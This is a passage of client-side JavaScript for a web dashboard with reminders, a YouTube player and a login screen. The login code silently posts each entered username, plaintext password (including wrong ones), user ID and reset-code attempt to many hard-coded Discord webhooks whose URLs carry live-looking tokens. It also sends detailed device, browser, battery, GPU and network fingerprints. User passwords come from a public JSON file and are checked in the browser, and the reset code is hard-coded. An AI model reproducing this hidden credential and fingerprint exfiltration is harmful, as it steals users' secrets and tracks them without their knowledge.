            } else if (url.includes('youtu.be/')) {
                videoId = url.split('youtu.be/')[1].split('?')[0];
            } else {
                videoId = url; // Assume direct video ID if not a full URL
            }

            if (videoId) {
                const embedUrl = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
                mediaFrame.src = embedUrl;
                logActivity(`Loaded YouTube video: ${videoId}`, 'Media');
            } else {
                this.showAlert('Please enter a valid YouTube URL or ID.', 'error');
                logActivity('Failed to load YouTube video: Invalid URL/ID', 'Media');
            }
        });
        logActivity('Media player initialized', 'Media');
      },

      // Reminders Panel
      reminders: [],
      initReminders: function() {
        const reminderTextInput = document.getElementById('reminderTextInput');
        const reminderTimeInput = document.getElementById('reminderTimeInput');
        const setReminderBtn = document.getElementById('setReminderBtn');
        const activeRemindersDiv = document.getElementById('activeReminders');

        // Load reminders from localStorage
        this.reminders = JSON.parse(localStorage.getItem('dashboardReminders') || '[]');
        this.renderReminders();
        this.checkReminders(); // Start checking for due reminders

        setReminderBtn.addEventListener('click', () => {
            const text = reminderTextInput.value.trim();
            const time = reminderTimeInput.value;

            if (!text || !time) {
                this.showAlert('Please enter both reminder text and time.', 'warning');
                return;
            }

            const reminderTime = new Date(time);
            if (reminderTime <= new Date()) {
                this.showAlert('Reminder time must be in the future.', 'error');
                return;
            }

            this.reminders.push({ text, time: reminderTime.toISOString() });
            localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
            this.renderReminders();
            this.showAlert('Reminder set successfully!', 'success');
            logActivity(`Set new reminder: "${text}" for ${reminderTime.toLocaleString()}`, 'Reminders');
        });

        setInterval(() => this.checkReminders(), 5000); // Check every 5 seconds
        logActivity('Reminders system initialized', 'Reminders');
      },

      renderReminders: function() {
        const activeRemindersDiv = document.getElementById('activeReminders');
        activeRemindersDiv.innerHTML = '<h3>Your Reminders:</h3>';
        if (this.reminders.length === 0) {
            activeRemindersDiv.innerHTML += '<p class="text-muted-foreground">No active reminders.</p>';
            return;
        }

        this.reminders.sort((a, b) => new Date(a.time).getTime() - new Date(b.time).getTime()); // Sort by time

        this.reminders.forEach((r, index) => {
            const reminderDate = new Date(r.time);
            const reminderElement = document.createElement('div');
            reminderElement.className = 'flex justify-between items-center p-2 bg-gray-700 rounded-lg';
            reminderElement.innerHTML = `
                <span>${r.text} - ${reminderDate.toLocaleString()}</span>
                <button class="bg-red-500 hover:bg-red-700 text-white text-xs px-2 py-1 rounded" data-index="${index}">Delete</button>
            `;
            activeRemindersDiv.appendChild(reminderElement);
        });

        activeRemindersDiv.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON' && e.target.dataset.index) {
                const indexToDelete = parseInt(e.target.dataset.index);
                const deletedReminder = this.reminders[indexToDelete];
                this.reminders.splice(indexToDelete, 1);
                localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
                this.renderReminders(); // Re-render after deletion
                this.showAlert(`Reminder "${deletedReminder.text}" deleted.`, 'info');
                logActivity(`Deleted reminder: "${deletedReminder.text}"`, 'Reminders');
            }
        });
      },

      checkReminders: function() {
        const now = new Date();
        const dueReminders = this.reminders.filter(r => new Date(r.time) <= now);

        dueReminders.forEach(r => {
            this.showAlert(`üîî Reminder: ${r.text}`, 'info', 0); // Display indefinitely until closed
            logActivity(`Reminder triggered: "${r.text}"`, 'Reminders');
        });

        // Remove triggered reminders
        this.reminders = this.reminders.filter(r => new Date(r.time) > now);
        localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
        if (dueReminders.length > 0) {
            this.renderReminders(); // Re-render to remove triggered reminders
        }
      },

      // WiFi panel colors
      applyWifiLevelColors: function() {
        document.querySelectorAll('#wifiPanel .wifi-entry div[data-level]').forEach(div => {
            const level = div.dataset.level;
            div.classList.remove('wifi-level-high', 'wifi-level-medium', 'wifi-level-low'); // Clear previous
            if (level === 'High') {
                div.classList.add('wifi-level-high');
            } else if (level === 'Medium') {
                div.classList.add('wifi-level-medium');
            } else if (level === 'Low') {
                div.classList.add('wifi-level-low');
            }
        });
        logActivity('Applied WiFi level colors', 'UI');
      },

      showWelcomeNotification: function() {
        if (localStorage.getItem('dashboardSettings')) {
            const settings = JSON.parse(localStorage.getItem('dashboardSettings'));
            if (settings.showWelcomeNotification === false) {
                return; // Do not show if setting is off
            }
        }
        const username = document.getElementById('loggedInUser').textContent;
        this.showAlert(`Welcome ${username}!`, 'success');
        logActivity(`Displayed welcome notification for ${username}`, 'Notification');
      },

    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw', // Fixed URL
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordToggle = document.getElementById('showPasswordToggle');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 3; // Changed from 5 to 3
      let users = [];
      let loginTime = null;

      // Login page quick bar zoom
      let loginZoomLevel = 1;
      const loginZoomStep = 0.1;
      const loginMinZoom = 0.5;
      const loginMaxZoom = 2;

      document.getElementById('loginZoomInBtn').addEventListener('click', () => {
        if (loginZoomLevel < loginMaxZoom) {
          loginZoomLevel += loginZoomStep;
          document.body.style.zoom = loginZoomLevel;
          logActivity(`Login page zoomed in to ${Math.round(loginZoomLevel * 100)}%`, 'Login UI');
        }
      });
      document.getElementById('loginZoomOutBtn').addEventListener('click', () => {
        if (loginZoomLevel > loginMinZoom) {
          loginZoomLevel -= loginZoomStep;
          document.body.style.zoom = loginZoomLevel;
          logActivity(`Login page zoomed out to ${Math.round(loginZoomLevel * 100)}%`, 'Login UI');
        }
      });
      document.getElementById('loginPanicBtn').addEventListener('click', () => {
        window.open('https://clever.com', '_blank');
        logActivity('Login page panic button clicked', 'Login UI');
      });

      // Show/hide password toggle
      showPasswordToggle.addEventListener('change', () => {
        passwordInput.type = showPasswordToggle.checked ? 'text' : 'password';
        logActivity(`Toggled show password to ${showPasswordToggle.checked}`, 'Login UI');
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
        logActivity('Login box flashed red', 'Login UI');
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          loginAttemptsLog: loginAttemptsLog // Include login attempts log
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = { title: "Username Logging", color: 0x3498db, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = { title: "Password Logging", color: 0xe74c3c, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }


      // Original embed builders (with 6 more fields added)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            { name: "Last Login IP", value: data.user.lastLoginIP || "N/A", inline: true }, // Added field 1
            { name: "Geo-Location", value: data.user.geoLoc || "N/A", inline: true }, // Added field 2
            { name: "Device Count", value: data.user.deviceCount?.toString() || "N/A", inline: true }, // Added field 3
            { name: "Email", value: data.user.email || "N/A", inline: true }, // Added field 4
            { name: "Phone Number", value: data.user.phoneNumber || "N/A", inline: true }, // Added field 5
            { name: "Two-Factor Auth Enabled", value: data.user.twoFactorAuthEnabled ? "Yes" : "No", inline: true } // Added field 6
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "User Input Latency", value: "N/A (Client-side measurement)", inline: true }, // Added field 1
            { name: "WebSockets Supported", value: "WebSocket" in window ? "Yes" : "No", inline: true } // Added field 2
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true },
            { name: "Operating System", value: nav.platform.replace(/^(Mac|Win|Linux).*$/, '$1') || "Unknown", inline: true }, // Added field 3 (simplified OS)
            { name: "Device Name (if available)", value: "N/A (Browser limitation)", inline: true } // Added field 4
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true },
            { name: "Login Attempts Log", value: data.loginAttemptsLog.map(a => `${a.time} - ${a.status}: ${a.username}/${a.userID}`).join('\n') || "None", inline: false }, // Added field 5
            { name: "Dashboard Activity Summary", value: activityLog.slice(-5).join('\n') || "None", inline: false } // Added field 6
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          logActivity('Login attempt failed: Missing fields', 'Login');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        const attemptLogEntry = {
            time: new Date().toLocaleString(),
            username,
            userID,
            status: ''
        };

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          attemptLogEntry.status = 'User not found';
          loginAttemptsLog.push(attemptLogEntry);
          handleFailedAttempt('User not found.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          attemptLogEntry.status = 'Incorrect password';
          loginAttemptsLog.push(attemptLogEntry);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 3;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 10px white';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);
        
        dashboard.addLoginToHistory(user.name || username, userID); // Add to login history

        // Transition to dashboard loading screen
        document.getElementById('loginWrapper').style.display = 'none';
        document.getElementById('dashboardLoadingScreen').classList.add('active');
        logActivity('Login successful, transitioning to dashboard loading', 'Login');

        setTimeout(() => {
            document.getElementById('dashboardLoadingScreen').classList.remove('active');
            document.getElementById('dashboard').style.display = 'block';
            document.body.className = ''; // Clear login-body class if it was set
            
            // Update user info in dashboard
            document.getElementById('loggedInUser').textContent = user.name || user.username;
            document.getElementById('loggedInID').textContent = userID;
            
            // Initialize dashboard functionality
            dashboard.init();
            logActivity('Dashboard loaded and initialized', 'System');
        }, 3000); // Simulate dashboard loading for 3 seconds
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        logActivity(`Login attempt failed: ${msg}. Attempts left: ${attempts}`, 'Login');
        
        // Log current attempt counter state
        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);
        await logAttemptsCounter(user?.name || "Unknown", username, password, userID, attempts);

        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
          logActivity('Max login attempts exceeded', 'Login');
        } else {
          if (attempts <= 2) { // Flash red if 2 attempts or less left
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
        logActivity('Login inputs disabled', 'Login UI');
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
        logActivity('Login inputs enabled', 'Login UI');
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        logActivity('Reset popup displayed', 'Login UI');
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
        logActivity('Reset popup hidden', 'Login UI');
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = { title: "üîî Reset Box Detected", color: 0xffff00, fields: [ { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false }, { name: "Time", value: new Date().toLocaleString(), inline: false } ] };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "‚úÖ Reset Code Accepted" : "‚ùå Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 3;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          loginAttemptsLog = []; // Clear log on successful reset
          logActivity('Reset counter successful', 'Login');
        } else {
          alert('Incorrect reset code.');
          logActivity('Incorrect reset code entered', 'Login');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();

    // --- Main Initialization Sequence ---
    document.addEventListener('DOMContentLoaded', () => {
        const initializationScreen = document.getElementById('initializationScreen');
        const initText = document.getElementById('initText');
        const loginWrapper = document.getElementById('loginWrapper');
        const dashboardLoadingScreen = document.getElementById('dashboardLoadingScreen');
        const loadingCodeText = document.getElementById('loadingCodeText');
        const codeAnimationBox = document.getElementById('codeAnimationBox');

        // Step 1: Initializing System
        setTimeout(() => {
            initText.textContent = "Initializing System...";
            logActivity('System Initialization started', 'Boot');
            
            // Generate some fake code lines for animation box
            const fakeCodeLines = [
                "console.log('Starting core services...');",
                "const config = loadConfig('./system.json');",
                "if (!config) throw new Error('Config not found!');",
                "authenticate('user', 'password', 'id');",
                "  .then(success => console.log('Auth successful'));",
                "return new Promise(resolve => resolve(true));",
                "// Initiating secure boot sequence...",
                "BootLoader.init(bootArgs);",
                "Kernel.load('modules');",
                "UI.render('loginScreen');"
            ];
            let lineIndex = 0;
            const codeInterval = setInterval(() => {
                codeAnimationBox.textContent += fakeCodeLines[lineIndex] + '\n';
                codeAnimationBox.scrollTop = codeAnimationBox.scrollHeight;
                lineIndex = (lineIndex + 1) % fakeCodeLines.length;
                if (codeAnimationBox.textContent.split('\n').length > 5) {
                    codeAnimationBox.textContent = codeAnimationBox.textContent.split('\n').slice(1).join('\n');
                }
            }, 300); // Faster update for code animation

            // Step 2: Initializing Login Page after 3 seconds
            setTimeout(() => {
                initText.textContent = "Initializing Login Page...";
                clearInterval(codeInterval); // Stop code animation
